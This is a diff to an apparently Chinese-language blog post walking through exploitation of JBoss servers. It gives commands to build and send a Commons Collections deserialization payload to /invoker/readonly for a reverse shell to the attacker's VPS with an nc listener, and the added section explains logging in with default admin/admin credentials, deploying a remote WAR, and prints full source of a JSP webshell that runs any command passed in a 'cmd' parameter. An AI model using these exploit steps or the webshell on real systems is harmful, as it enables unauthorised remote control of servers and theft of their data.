@@ -84,6 +84,57 @@
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先我们要找到一个jboss搭建的网站，访问路径/invoker/readonly 出现500，那么说明可能存在漏洞<br><img src="/img/01.png" alt><br>以防万一，我们再使用jboss的检测工具，检测一下，发现存在jboss漏洞<br>!<img src="/img/02.png" alt></p>
 <p>下载利用工具：JavaDeserH2HC（<a href="http://scan.javasec.cn/java/JavaDeserH2HC.zip）" target="_blank" rel="noopener">http://scan.javasec.cn/java/JavaDeserH2HC.zip）</a><br>接下来输入命令：<br>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java<br>java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap +vps：port //反弹shell的IP和端口<br><img src="/img/03.png" alt><br>在本地监听端口：<br>nc -lvvp 1234</p>
 <p>再次执行以下命令：<br>curl <a href="http://ip:8080/invoker/readonly" target="_blank" rel="noopener">http://ip:8080/invoker/readonly</a> –data-binary @ReverseShellCommonsCollectionsHashMap.ser<br><img src="/img/04.png" alt><br>反弹成功</p>
+<h2 id="第二种（通过上传获取webshell）"><a href="#第二种（通过上传获取webshell）" class="headerlink" title="第二种（通过上传获取webshell）"></a>第二种（通过上传获取webshell）</h2><p>输入默认账户密码admin admin<br><img src="/img/1.png" alt><br>全局搜索jboss.system,点击进入</p>
+<p><img src="/img/21.png" alt><br>1.制作war包<br>把木马文件gg.jsp(我是一个直接执行命令代码)用压缩软件压缩为zip,然后更改后缀为war，然后将该war上传到互联网上能够访问的网站上</p>
+<p>//gg.jsp<br>&lt;%@ page contentType=”text/html;charset=big5” session=”false” import=”java.io.*” %&gt;</p>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+
+<title></title>
+
+<meta http-equiv="Content-Type" content="text/html; charset=big5">
+
+</head>
+
+<body>
+
+<p>&lt;%</p>
+<p>Runtime runtime = Runtime.getRuntime();</p>
+<p>Process process =null;</p>
+<p>String line=null;</p>
+<p>InputStream is =null;</p>
+<p>InputStreamReader isr=null;</p>
+<p>BufferedReader br =null;</p>
+<p>String ip=request.getParameter(“cmd”);</p>
+<p>try</p>
+<p>{</p>
+<p>process =runtime.exec(ip);</p>
+<p>is = process.getInputStream();</p>
+<p>isr=new InputStreamReader(is);</p>
+<p>br =new BufferedReader(isr);</p>
+<p>out.println(“<pre>");</pre></p>
+<p>while( (line = br.readLine()) != null )</p>
+<p>{</p>
+<p>  out.println(line);</p>
+<p>  out.flush();</p>
+<p>}</p>
+<p>out.println("“);</p>
+<p>is.close();</p>
+<p>isr.close();</p>
+<p>br.close();</p>
+<p>}</p>
+<p>catch(IOException e )</p>
+<p>{</p>
+<p>out.println(e);</p>
+<p>runtime.exit(1);</p>
+<p>}</p>
+<p>%&gt;</p>
+</body>
+
+</html>
+
+<p>2.进入jboss.system页面找到如下，填入远程的war文件地址、<br>void deploy（两种）<br><img src="/img/6.png" alt><br><img src="/img/7.png" alt><br>成功部署的界面如下<br><img src="/img/4.png" alt><br>3.访问shell地址,并执行命令<br><img src="/img/5.png" alt></p>
 
       
     </div>
